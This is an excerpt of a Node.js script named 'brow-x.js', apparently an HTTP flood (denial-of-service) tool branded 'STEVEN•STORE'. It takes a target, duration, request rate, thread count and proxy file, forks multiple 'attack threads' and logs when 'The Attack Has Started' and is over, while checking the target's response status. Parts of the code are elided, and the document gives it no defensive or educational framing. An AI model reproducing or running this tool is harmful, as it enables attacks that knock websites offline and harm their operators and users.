...
if (process.argv.length < 7){console.log(`Usage: node brow-x.js target time rate thread proxyfile`); process.exit();}
const headers = {};
...
const getCurrentTime = () => {
 ...
 Promise.race([axiosPromise, timeoutPromise])
   .then((response) => {
     ...
     console.log(`[\x1b[35mSTEVEN•STORE〽\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
   })
   .catch((error) => {
     if (error.message === 'Request timed out') {
       console.log(`[\x1b[35mSTEVEN•STORE〽\x1b[0m] ${getCurrentTime()} Request Timed Out`);
...
if (cluster.isMaster){
 ...
 for (let i = 1; i <= process.argv[5]; i++){
   cluster.fork();
   console.log(`[\x1b[35mSTEVEN•STORE〽\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
 }
 console.log(`[\x1b[35mSTEVEN•STORE〽\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
 setInterval(getStatus, 2000);
 setTimeout(() => {
   console.log(`[\x1b[35mSTEVEN•STORE〽\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
   process.exit(1);
 }, process.argv[3] * 1000);
} 
